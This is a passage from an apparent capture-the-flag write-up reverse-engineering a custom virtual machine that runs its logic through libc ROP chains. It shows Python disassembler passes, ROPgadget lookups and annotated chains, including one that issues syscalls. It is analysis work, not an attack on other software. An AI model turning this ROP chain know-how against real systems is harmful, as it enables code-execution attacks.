</span>        <span class="n">match</span> <span class="n">instructions</span><span class="p">[</span><span class="n">idx</span><span class="p">:</span><span class="n">idx</span><span class="o">+</span><span class="mi">3</span><span class="p">]:</span>
            <span class="n">case</span> <span class="p">[</span><span class="o">*</span><span class="n">_</span><span class="p">,</span> <span class="n">MovImm</span><span class="p">(</span><span class="n">reg</span><span class="o">=</span><span class="mi">5</span><span class="p">,</span> <span class="n">imm</span><span class="o">=</span><span class="n">imm</span><span class="p">),</span> <span class="n">Call</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="mh">0x2667</span><span class="p">)]</span> <span class="o">|</span> \
                 <span class="p">[</span><span class="n">MovImm</span><span class="p">(</span><span class="n">reg</span><span class="o">=</span><span class="mi">5</span><span class="p">,</span> <span class="n">imm</span><span class="o">=</span><span class="n">imm</span><span class="p">),</span> <span class="o">*</span><span class="n">_</span><span class="p">,</span> <span class="n">Call</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="mh">0x2667</span><span class="p">)]:</span>
                <span class="n">magic_blocks</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">imm</span><span class="p">)</span>
        <span class="n">idx</span> <span class="o">+=</span> <span class="mi">1</span>
    <span class="k">return</span> <span class="n">magic_blocks</span>
</code></pre></div></div>

<p>Now we need to rework our <code class="language-plaintext highlighter-rouge">dump_data</code> to work with these new magic dumps</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">dump_data</span><span class="p">(</span><span class="n">start_of_data</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">labels</span><span class="p">,</span> <span class="n">magic_blocks</span><span class="p">):</span>
    <span class="n">printable</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">string</span><span class="p">.</span><span class="n">printable</span><span class="p">,</span> <span class="s">'ascii'</span><span class="p">)</span>
    <span class="n">offset</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="k">while</span> <span class="n">offset</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
        <span class="n">byte</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="n">offset</span><span class="p">]</span>
        <span class="n">data_offset</span> <span class="o">=</span> <span class="n">start_of_data</span> <span class="o">+</span> <span class="n">offset</span>
        <span class="k">if</span> <span class="n">data_offset</span> <span class="ow">in</span> <span class="n">labels</span><span class="p">:</span>
            <span class="k">print</span><span class="p">()</span>
            <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="si">{</span><span class="n">labels</span><span class="p">[</span><span class="n">data_offset</span><span class="p">]</span><span class="si">}</span><span class="s">:'</span><span class="p">)</span>
        <span class="c1">#print(f'{data_offset:04x} ', end='')
</span>        <span class="k">if</span> <span class="n">data_offset</span> <span class="ow">in</span> <span class="n">magic_blocks</span><span class="p">:</span>
            <span class="n">start_of_magic</span> <span class="o">=</span> <span class="n">offset</span>
            <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
                <span class="n">sub_data</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="n">offset</span><span class="p">:</span><span class="n">offset</span><span class="o">+</span><span class="mi">8</span><span class="p">]</span>
                <span class="n">val</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">sub_data</span><span class="p">)</span>
                <span class="n">offset</span> <span class="o">+=</span> <span class="mi">8</span>
                <span class="n">val</span> <span class="o">^=</span> <span class="mh">0x676e614765636944</span>
                <span class="k">if</span> <span class="n">val</span> <span class="o">==</span> <span class="mh">0xdeadbeefdeadbeef</span><span class="p">:</span>
                    <span class="k">print</span><span class="p">(</span><span class="s">'</span><span class="se">\t</span><span class="s">.magicend'</span><span class="p">)</span>
                    <span class="k">break</span>
                <span class="n">key</span> <span class="o">=</span> <span class="n">val</span> <span class="o">&gt;&gt;</span> <span class="mh">0x38</span>
                <span class="n">val</span> <span class="o">=</span> <span class="n">val</span> <span class="o">&amp;</span> <span class="mh">0xffffffffffffff</span>
                <span class="k">if</span> <span class="n">key</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
                    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="se">\t</span><span class="s">.mraw  0x</span><span class="si">{</span><span class="n">val</span><span class="p">:</span><span class="n">x</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
                <span class="k">elif</span> <span class="n">key</span> <span class="o">==</span> <span class="mh">0x34</span><span class="p">:</span>
                    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="se">\t</span><span class="s">.mlibc 0x</span><span class="si">{</span><span class="n">val</span><span class="p">:</span><span class="n">x</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
                <span class="k">elif</span> <span class="n">key</span> <span class="o">==</span> <span class="mh">0x56</span><span class="p">:</span>
                    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="se">\t</span><span class="s">.mexe  0x</span><span class="si">{</span><span class="n">val</span><span class="p">:</span><span class="n">x</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
                <span class="k">else</span><span class="p">:</span>
                    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="se">\t</span><span class="s">.munchanged ; offset 0x</span><span class="si">{</span><span class="p">(</span><span class="n">offset</span> <span class="o">-</span> <span class="mi">8</span> <span class="o">-</span> <span class="n">start_of_magic</span><span class="p">):</span><span class="n">x</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="k">if</span> <span class="n">byte</span> <span class="ow">in</span> <span class="n">printable</span><span class="p">:</span>
                <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="se">\t</span><span class="s">.db 0x</span><span class="si">{</span><span class="n">byte</span><span class="p">:</span><span class="n">x</span><span class="si">}</span><span class="s"> ; </span><span class="si">{</span><span class="nb">chr</span><span class="p">(</span><span class="n">byte</span><span class="p">)</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="se">\t</span><span class="s">.db 0x</span><span class="si">{</span><span class="n">byte</span><span class="p">:</span><span class="n">x</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
            <span class="n">offset</span> <span class="o">+=</span> <span class="mi">1</span>
</code></pre></div></div>

<p>Which gives us a nice output now showing which things are from libc and from the executable</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>DAT_27f3:
	.mlibc 0x4a550
	.mexe  0x193b
	.mlibc 0x26b72
	.mexe  0x4048
	.mlibc 0x9f822
	.mraw  0x0
...
	.mexe  0xc060
	.magicend
</code></pre></div></div>

<p>It looks like we only have one lot of data resolved using this, so let’s look at the calls to <code class="language-plaintext highlighter-rouge">FUNC_2667</code> a little more and it looks like we have covered the calls which use <code class="language-plaintext highlighter-rouge">DAT_27f3</code> however <code class="language-plaintext highlighter-rouge">FUNC_2504</code> which uses the <code class="language-plaintext highlighter-rouge">r4</code> argument as the source is not covered, so let’s modify the discovery algorithm for magic copy’s to include it as a source.</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">identify_magic_blocks</span><span class="p">(</span><span class="n">instructions</span><span class="p">):</span>
    <span class="p">...</span>
            <span class="n">case</span> <span class="p">[</span><span class="o">*</span><span class="n">_</span><span class="p">,</span> <span class="n">MovImm</span><span class="p">(</span><span class="n">reg</span><span class="o">=</span><span class="mi">4</span><span class="p">,</span> <span class="n">imm</span><span class="o">=</span><span class="n">imm</span><span class="p">),</span> <span class="n">Call</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="mh">0x2504</span><span class="p">)]:</span>
                <span class="n">magic_blocks</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">imm</span><span class="p">)</span>
</code></pre></div></div>

<h4 id="getting-rop-gadget-instructions">Getting ROP gadget instructions</h4>

<p>But you know what would be nice? Knowing what these gadgets are, I’ll just be grabbing the libc one’s for this, if your doing this yourself feel free to do the same for the executable but I found they weren’t necessary.</p>

<p>So in order to this we need a way to lookup the gadget at the specified address, I could do this at runtime using pwntools’s <code class="language-plaintext highlighter-rouge">ROP</code> and <code class="language-plaintext highlighter-rouge">raw</code> however I pick a slightly more efficient and use <code class="language-plaintext highlighter-rouge">ROPgadget</code> to dump all gadgets then find them when I need them, so first let’s dump the gadgets</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ROPgadget --all  --binary libc-2.31.so &gt; libc-rops.txt
</code></pre></div></div>

<p>And we can look them up in python</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">get_libc_rop</span><span class="p">(</span><span class="n">addr</span><span class="p">):</span>
    <span class="n">addr_as_str</span> <span class="o">=</span> <span class="sa">f</span><span class="s">'0x</span><span class="si">{</span><span class="n">addr</span><span class="p">:</span><span class="mi">016</span><span class="n">x</span><span class="si">}</span><span class="s">'</span>
    <span class="c1"># Built with: ROPgadget --all --binary breach &gt; libc-rops.txt
</span>    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">'libc-rops.txt'</span><span class="p">)</span> <span class="k">as</span> <span class="n">rop_file</span><span class="p">:</span>
        <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">rop_file</span><span class="p">:</span>
            <span class="k">if</span> <span class="n">line</span><span class="p">.</span><span class="n">startswith</span><span class="p">(</span><span class="n">addr_as_str</span><span class="p">):</span>
                <span class="k">return</span> <span class="n">line</span><span class="p">[</span><span class="nb">len</span><span class="p">(</span><span class="n">addr_as_str</span><span class="p">)</span><span class="o">+</span><span class="mi">3</span><span class="p">:].</span><span class="n">strip</span><span class="p">()</span>
    <span class="k">return</span> <span class="s">''</span>
</code></pre></div></div>

<p>Then finally we call this function when output <code class="language-plaintext highlighter-rouge">.mlibc</code></p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">dump_data</span><span class="p">(</span><span class="n">start_of_data</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">labels</span><span class="p">,</span> <span class="n">magic_blocks</span><span class="p">):</span>
    <span class="p">...</span>
                <span class="k">elif</span> <span class="n">key</span> <span class="o">==</span> <span class="mh">0x34</span><span class="p">:</span>
                    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="se">\t</span><span class="s">.mlibc 0x</span><span class="si">{</span><span class="n">val</span><span class="p">:</span><span class="n">x</span><span class="si">}</span><span class="s"> ; </span><span class="si">{</span><span class="n">get_libc_rop</span><span class="p">(</span><span class="n">val</span><span class="p">)</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
</code></pre></div></div>

<p>Now these dumps look much better to understand the ROP chains</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>DAT_299b:
	.mlibc 0x162866 ; pop rdx ; pop rbx ; ret
	.munchanged ; offset 0x8
	.munchanged ; offset 0x10
	.mlibc 0x26b72 ; pop rdi ; ret
	.munchanged ; offset 0x20
	.mlibc 0x4514d ; mov qword ptr [rdi], rdx ; ret
	.magicend
</code></pre></div></div>

<h3 id="looking-back-at-the-initialization-rop">Looking back at the initialization ROP</h3>
<p>Let’s go back and look at that ROP which was setup prior to the first <code class="language-plaintext highlighter-rouge">halt</code> expected to be after the stack first relocates to <code class="language-plaintext highlighter-rouge">&amp;mem[0x8000]</code>, I have added comments to make it easier to understand</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">DAT_27f3:</span>
	<span class="p">.</span><span class="n">mlibc</span> <span class="mh">0x4a550</span> <span class="p">;</span> <span class="n">pop</span> <span class="n">rax</span> <span class="p">;</span> <span class="n">ret</span>
	<span class="p">.</span><span class="n">mexe</span>  <span class="mh">0x193b</span> <span class="c1">// continuation of instruction pointer loop</span>
	<span class="p">.</span><span class="n">mlibc</span> <span class="mh">0x26b72</span> <span class="p">;</span> <span class="n">pop</span> <span class="n">rdi</span> <span class="p">;</span> <span class="n">ret</span>
	<span class="p">.</span><span class="n">mexe</span>  <span class="mh">0x4048</span> <span class="c1">// The address of 'should_halt'</span>
	<span class="p">.</span><span class="n">mlibc</span> <span class="mh">0x9f822</span> <span class="p">;</span> <span class="n">pop</span> <span class="n">rcx</span> <span class="p">;</span> <span class="n">ret</span>
	<span class="p">.</span><span class="n">mraw</span>  <span class="mh">0x0</span>
    <span class="c1">// Set 'should_halt' to false</span>
	<span class="p">.</span><span class="n">mlibc</span> <span class="mh">0xba056</span> <span class="p">;</span> <span class="n">mov</span> <span class="n">qword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">rdi</span><span class="p">],</span> <span class="n">rcx</span> <span class="p">;</span> <span class="n">ret</span>
	<span class="p">.</span><span class="n">mlibc</span> <span class="mh">0x26b72</span> <span class="p">;</span> <span class="n">pop</span> <span class="n">rdi</span> <span class="p">;</span> <span class="n">ret</span>
	<span class="p">.</span><span class="n">mexe</span>  <span class="mh">0xc060</span> <span class="c1">// &amp;mem[0x8000]</span>
	<span class="p">.</span><span class="n">mlibc</span> <span class="mh">0x9f822</span> <span class="p">;</span> <span class="n">pop</span> <span class="n">rcx</span> <span class="p">;</span> <span class="n">ret</span>
	<span class="p">.</span><span class="n">mlibc</span> <span class="mh">0x270b1</span> <span class="p">;</span> <span class="n">call</span> <span class="n">rax</span>
    <span class="c1">// Set mem[0x8000] to 'call rax; ret' gadget</span>
    <span class="c1">// rax is continuation of the instruction pointer loop</span>
	<span class="p">.</span><span class="n">mlibc</span> <span class="mh">0xba056</span> <span class="p">;</span> <span class="n">mov</span> <span class="n">qword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">rdi</span><span class="p">],</span> <span class="n">rcx</span> <span class="p">;</span> <span class="n">ret</span>
    <span class="c1">// Set the base pointer to &amp;mem[0x7FA0]</span>
	<span class="p">.</span><span class="n">mlibc</span> <span class="mh">0x256c0</span> <span class="p">;</span> <span class="n">pop</span> <span class="n">rbp</span> <span class="p">;</span> <span class="n">ret</span>
	<span class="p">.</span><span class="n">mexe</span>  <span class="mh">0xc000</span> <span class="c1">// &amp;mem[0x7FA0]</span>
    <span class="c1">// Set the stack pointer to &amp;mem[0x8000]</span>
	<span class="p">.</span><span class="n">mlibc</span> <span class="mh">0x32b5a</span> <span class="p">;</span> <span class="n">pop</span> <span class="n">rsp</span> <span class="p">;</span> <span class="n">ret</span>
	<span class="p">.</span><span class="n">mexe</span>  <span class="mh">0xc060</span> <span class="c1">// &amp;mem[0x8000]</span>
	<span class="p">.</span><span class="n">magicend</span>
</code></pre></div></div>

<p>To simplify this it sets <code class="language-plaintext highlighter-rouge">should_halt</code> back to false (remember this is after a <code class="language-plaintext highlighter-rouge">halt</code>), and changes the stack so that it’s pointing to <code class="language-plaintext highlighter-rouge">mem[0x8000]</code> and ready’s it to continue the loop, meaning this will just keep the loop going after the <code class="language-plaintext highlighter-rouge">halt</code>.</p>

<p>If you look at <code class="language-plaintext highlighter-rouge">FUNC_2504</code> you can see this actually get’s used with other ROP chains which likely do the actual work.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>FUNC_2504:
	mov r5, r4
	mov r4, 0x8000
	call FUNC_2667

	mov r5, DAT_27f3 ; 0x27f3
	call FUNC_2667

	call FUNC_27b3

	halt
	ret
</code></pre></div></div>

<h3 id="register-naming">Register naming</h3>

<p>Earlier we established that <code class="language-plaintext highlighter-rouge">r15</code> was a stack pointer, and pretty much eliminated it completely aside from initialization.</p>

<p>However there are two other registers which appear to have a global meaning after initialization these are <code class="language-plaintext highlighter-rouge">r2</code> which is the libc base address and <code class="language-plaintext highlighter-rouge">r3</code> which is the executable base address, you can verify this by searching all the code for the usages of these registers and find they only ever get read after initialization.</p>

<p>So let’s rename these variables that we know to <code class="language-plaintext highlighter-rouge">rexe</code>, <code class="language-plaintext highlighter-rouge">rlibc</code> and <code class="language-plaintext highlighter-rouge">rsp</code> which should make some of the disassembly even easier to read, without having to think about their hidden meaning.</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">reg_names</span> <span class="o">=</span> <span class="p">(</span><span class="s">'r0'</span><span class="p">,</span> <span class="s">'r1'</span><span class="p">,</span> <span class="s">'rlibc'</span><span class="p">,</span> <span class="s">'rexe'</span><span class="p">,</span> <span class="s">'r4'</span><span class="p">,</span> <span class="s">'r5'</span><span class="p">,</span> <span class="s">'r6'</span><span class="p">,</span> <span class="s">'r7'</span><span class="p">,</span> <span class="s">'r8'</span><span class="p">,</span>
             <span class="s">'r9'</span><span class="p">,</span> <span class="s">'r10'</span><span class="p">,</span> <span class="s">'r11'</span><span class="p">,</span> <span class="s">'r12'</span><span class="p">,</span> <span class="s">'r13'</span><span class="p">,</span> <span class="s">'r14'</span><span class="p">,</span> <span class="s">'rsp'</span><span class="p">)</span>
</code></pre></div></div>

<p>I won’t show the entire change of the <code class="language-plaintext highlighter-rouge">dump</code> function, this write-up is already way too long, but the general change is that outputs of registers now look like</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="se">\t</span><span class="s">mov </span><span class="si">{</span><span class="n">reg_names</span><span class="p">[</span><span class="n">reg1</span><span class="p">]</span><span class="si">}</span><span class="s">, </span><span class="si">{</span><span class="n">reg_names</span><span class="p">[</span><span class="n">reg2</span><span class="p">]</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
</code></pre></div></div>

<p>Now if we look at the result, you can see how easy it is to identify what’s an offset with the executable or libc</p>
<table>
<tr>
<th>Before</th>
<th>After</th>
</tr>
<tr>
<td>
<pre>
mov r9, r3
mov r0, 0x6060
add r9, r0
</pre>
</td>
<td>
<pre>
mov r9, rexe
mov r0, 0x6060
add r9, r0
</pre>
</td>
</tr>
</table>

<h3 id="naming-what-was-learnt-so-far">Naming what was learnt so far</h3>

<p>This is already turning into a fairly big project, so let’s update our labels with some names for existing functions and data that we know about</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>labels[0x2584] = 'init'
labels[0x276d] = 'init_set_stack'
labels[0x2667] = 'magic_copy'
labels[0x27f3] = 'ROP_continue_loop'
labels[0x2504] = 'execute_rop'
</code></pre></div></div>

<h3 id="finding-the-syscall">Finding the syscall</h3>

<p>Let’s continue on from just after <code class="language-plaintext highlighter-rouge">init</code> and you will see the following call</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	mov r8, 0x16
	mov r9, rexe
	mov r0, 0x6060
	add r9, r0
	call FUNC_2353
</code></pre></div></div>

<p>Let’s dig into <code class="language-plaintext highlighter-rouge">FUNC_2353</code> (this get’s called 18 times so understanding it will solve a lot of things)</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>FUNC_2353:
	mov r0, 0x8008
	store mem[r0], r12
	mov r0, 0x8018
	store mem[r0], r13
	mov r0, 0x8050
	store mem[r0], r8
	mov r0, 0x8060
	store mem[r0], r9
	mov r0, 0x8070
	store mem[r0], r10
	mov r0, 0x8080
	store mem[r0], r11
	mov r4, DAT_287b ; 0x287b
	call execute_rop

	ret
</code></pre></div></div>

<p>It looks like this uses the ROP <code class="language-plaintext highlighter-rouge">DAT_287b</code> and fills a bunch of things with regiters <code class="language-plaintext highlighter-rouge">r8</code>-<code class="language-plaintext highlighter-rouge">r13</code>, remember <code class="language-plaintext highlighter-rouge">execute_rop</code> stores the ROP at <code class="language-plaintext highlighter-rouge">0x8000</code> so these are offsets with <code class="language-plaintext highlighter-rouge">DAT_287b</code>, so let’s take a look at this ROP</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">DAT_287b:</span>
	<span class="p">.</span><span class="n">mlibc</span> <span class="mh">0x1056fd</span> <span class="p">;</span> <span class="n">pop</span> <span class="n">rdx</span> <span class="p">;</span> <span class="n">pop</span> <span class="n">rcx</span> <span class="p">;</span> <span class="n">pop</span> <span class="n">rbx</span> <span class="p">;</span> <span class="n">ret</span>
	<span class="p">.</span><span class="n">munchanged</span> <span class="p">;</span> <span class="n">offset</span> <span class="mh">0x8</span> <span class="c1">// r12</span>
	<span class="p">.</span><span class="n">munchanged</span> <span class="p">;</span> <span class="n">offset</span> <span class="mh">0x10</span>
	<span class="p">.</span><span class="n">munchanged</span> <span class="p">;</span> <span class="n">offset</span> <span class="mh">0x18</span> <span class="c1">// r13</span>
	<span class="p">.</span><span class="n">mlibc</span> <span class="mh">0x4a550</span> <span class="p">;</span> <span class="n">pop</span> <span class="n">rax</span> <span class="p">;</span> <span class="n">ret</span>
	<span class="p">.</span><span class="n">mlibc</span> <span class="mh">0x25679</span> <span class="p">;</span> <span class="n">ret</span>
	<span class="p">.</span><span class="n">mlibc</span> <span class="mh">0x7b0cb</span> <span class="p">;</span> <span class="n">mov</span> <span class="n">r10</span><span class="p">,</span> <span class="n">rdx</span> <span class="p">;</span> <span class="n">jmp</span> <span class="n">rax</span>
	<span class="p">.</span><span class="n">mlibc</span> <span class="mh">0x11fdaa</span> <span class="p">;</span> <span class="n">mov</span> <span class="n">r8</span><span class="p">,</span> <span class="n">rbx</span> <span class="p">;</span> <span class="n">mov</span> <span class="n">rax</span><span class="p">,</span> <span class="n">r8</span> <span class="p">;</span> <span class="n">pop</span> <span class="n">rbx</span> <span class="p">;</span> <span class="n">ret</span>
	<span class="p">.</span><span class="n">munchanged</span> <span class="p">;</span> <span class="n">offset</span> <span class="mh">0x40</span>
	<span class="p">.</span><span class="n">mlibc</span> <span class="mh">0x4a550</span> <span class="p">;</span> <span class="n">pop</span> <span class="n">rax</span> <span class="p">;</span> <span class="n">ret</span>
	<span class="p">.</span><span class="n">munchanged</span> <span class="p">;</span> <span class="n">offset</span> <span class="mh">0x50</span> <span class="c1">// r8</span>
	<span class="p">.</span><span class="n">mlibc</span> <span class="mh">0x26b72</span> <span class="p">;</span> <span class="n">pop</span> <span class="n">rdi</span> <span class="p">;</span> <span class="n">ret</span>
	<span class="p">.</span><span class="n">munchanged</span> <span class="p">;</span> <span class="n">offset</span> <span class="mh">0x60</span> <span class="c1">// r9</span>
	<span class="p">.</span><span class="n">mlibc</span> <span class="mh">0x27529</span> <span class="p">;</span> <span class="n">pop</span> <span class="n">rsi</span> <span class="p">;</span> <span class="n">ret</span>
	<span class="p">.</span><span class="n">munchanged</span> <span class="p">;</span> <span class="n">offset</span> <span class="mh">0x70</span> <span class="c1">// r10</span>
	<span class="p">.</span><span class="n">mlibc</span> <span class="mh">0x1056fd</span> <span class="p">;</span> <span class="n">pop</span> <span class="n">rdx</span> <span class="p">;</span> <span class="n">pop</span> <span class="n">rcx</span> <span class="p">;</span> <span class="n">pop</span> <span class="n">rbx</span> <span class="p">;</span> <span class="n">ret</span>
	<span class="p">.</span><span class="n">munchanged</span> <span class="p">;</span> <span class="n">offset</span> <span class="mh">0x80</span> <span class="c1">// r11</span>
	<span class="p">.</span><span class="n">munchanged</span> <span class="p">;</span> <span class="n">offset</span> <span class="mh">0x88</span>
	<span class="p">.</span><span class="n">munchanged</span> <span class="p">;</span> <span class="n">offset</span> <span class="mh">0x90</span>
    <span class="c1">// (x86) = (VM)</span>
    <span class="c1">// rax = r8</span>
    <span class="c1">// rdi = r9</span>
    <span class="c1">// rsi = r10</span>
    <span class="c1">// rdx = r11</span>
    <span class="c1">// r10 = r12</span>
    <span class="c1">// r8 = r13</span>
	<span class="p">.</span><span class="n">mlibc</span> <span class="mh">0x66229</span> <span class="p">;</span> <span class="n">syscall</span>
	<span class="p">.</span><span class="n">mlibc</span> <span class="mh">0x331ff</span> <span class="p">;</span> <span class="n">pop</span> <span class="n">rbx</span> <span class="p">;</span> <span class="n">ret</span>
	<span class="p">.</span><span class="n">mexe</span>  <span class="mh">0x140a0</span> <span class="c1">// &amp;registers[8]</span>
    <span class="c1">// Set VM's r8 to the result of the syscall</span>
	<span class="p">.</span><span class="n">mlibc</span> <span class="mh">0x162d94</span> <span class="p">;</span> <span class="n">mov</span> <span class="n">qword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">rbx</span><span class="p">],</span> <span class="n">rax</span> <span class="p">;</span> <span class="n">pop</span> <span class="n">rax</span> <span class="p">;</span> <span class="n">pop</span> <span class="n">rdx</span> <span class="p">;</span> <span class="n">pop</span> <span class="n">rbx</span> <span class="p">;</span> <span class="n">ret</span>
	<span class="p">.</span><span class="n">mraw</span>  <span class="mh">0x0</span>
	<span class="p">.</span><span class="n">mraw</span>  <span class="mh">0x0</span>
	<span class="p">.</span><span class="n">mraw</span>  <span class="mh">0x0</span>
	<span class="p">.</span><span class="n">magicend</span>
</code></pre></div></div>

<p>From all of this we can now label this function and data</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">labels</span><span class="p">[</span><span class="mh">0x2353</span><span class="p">]</span> <span class="o">=</span> <span class="s">'syscall'</span>
<span class="n">labels</span><span class="p">[</span><span class="mh">0x287b</span><span class="p">]</span> <span class="o">=</span> <span class="s">'ROP_syscall'</span>
</code></pre></div></div>

<p>But considering there are 18 of these calls, we can probably solve a bunch of time with adding a comment for each call to <code class="language-plaintext highlighter-rouge">syscall</code> with the name of the system call.</p>

<p>The first thing we need to do is build a dictionary which turns the ‘rax’ register into the syscall name</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">syscall_names</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">([(</span>
                <span class="nb">int</span><span class="p">(</span><span class="nb">getattr</span><span class="p">(</span><span class="n">constants</span><span class="p">.</span><span class="n">linux</span><span class="p">.</span><span class="n">amd64</span><span class="p">,</span><span class="n">v</span><span class="p">)),</span><span class="n">v</span><span class="p">)</span> 
                <span class="k">for</span> <span class="n">v</span> <span class="ow">in</span> <span class="nb">dir</span><span class="p">(</span><span class="n">constants</span><span class="p">.</span><span class="n">linux</span><span class="p">.</span><span class="n">amd64</span><span class="p">)</span> <span class="k">if</span> <span class="n">v</span><span class="p">.</span><span class="n">startswith</span><span class="p">(</span><span class="s">'SYS_'</span><span class="p">)</span>
                <span class="p">])</span>
</code></pre></div></div>

<p>We’ll also make use an artifical instruction again</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">CallSyscall</span> <span class="o">=</span> <span class="n">namedtuple</span><span class="p">(</span><span class="s">'CallSyscall'</span><span class="p">,</span> <span class="p">[</span><span class="s">'addr'</span><span class="p">,</span> <span class="s">'target'</span><span class="p">,</span> <span class="s">'syscall'</span><span class="p">])</span>
</code></pre></div></div>

<p>Then finally the pass, first we find a call then look back through the last 10 instructions in reverse for an immediate move into <code class="language-plaintext highlighter-rouge">r8</code> (not perfect but haven’t seen it fail with this code)</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">pass_syscall_inst</span><span class="p">(</span><span class="n">instructions</span><span class="p">):</span>
    <span class="n">total_instructions</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">instructions</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">idx</span><span class="p">,</span> <span class="n">instruction</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">instructions</span><span class="p">):</span>
        <span class="n">match</span> <span class="n">instruction</span><span class="p">:</span>
            <span class="n">case</span> <span class="n">Call</span><span class="p">(</span><span class="n">addr</span><span class="o">=</span><span class="n">addr</span><span class="p">,</span> <span class="n">target</span><span class="o">=</span><span class="mh">0x2353</span><span class="p">):</span>
                <span class="k">for</span> <span class="n">prev_inst</span> <span class="ow">in</span> <span class="nb">reversed</span><span class="p">(</span><span class="n">instructions</span><span class="p">[</span><span class="nb">max</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">idx</span><span class="o">-</span><span class="mi">10</span><span class="p">):</span><span class="n">idx</span><span class="p">]):</span>
                    <span class="n">match</span> <span class="n">prev_inst</span><span class="p">:</span>
                        <span class="n">case</span> <span class="n">MovImm</span><span class="p">(</span><span class="n">reg</span><span class="o">=</span><span class="mi">8</span><span class="p">,</span> <span class="n">imm</span><span class="o">=</span><span class="n">imm</span><span class="p">):</span>
                            <span class="n">instructions</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="o">=</span> <span class="n">CallSyscall</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="mh">0x2353</span><span class="p">,</span> <span class="n">imm</span><span class="p">)</span>
                            <span class="k">break</span>
</code></pre></div></div>

<p>Then finally adding it to <code class="language-plaintext highlighter-rouge">dump</code> to show this in a comment</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">case</span> <span class="n">CallSyscall</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">target</span><span class="p">,</span> <span class="n">syscall</span><span class="p">):</span>
    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="se">\t</span><span class="s">call </span><span class="si">{</span><span class="n">labels</span><span class="p">[</span><span class="n">target</span><span class="p">]</span><span class="si">}</span><span class="s"> ; </span><span class="si">{</span><span class="n">syscall_names</span><span class="p">[</span><span class="n">syscall</span><span class="p">]</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
    <span class="k">print</span><span class="p">()</span>
</code></pre></div></div>

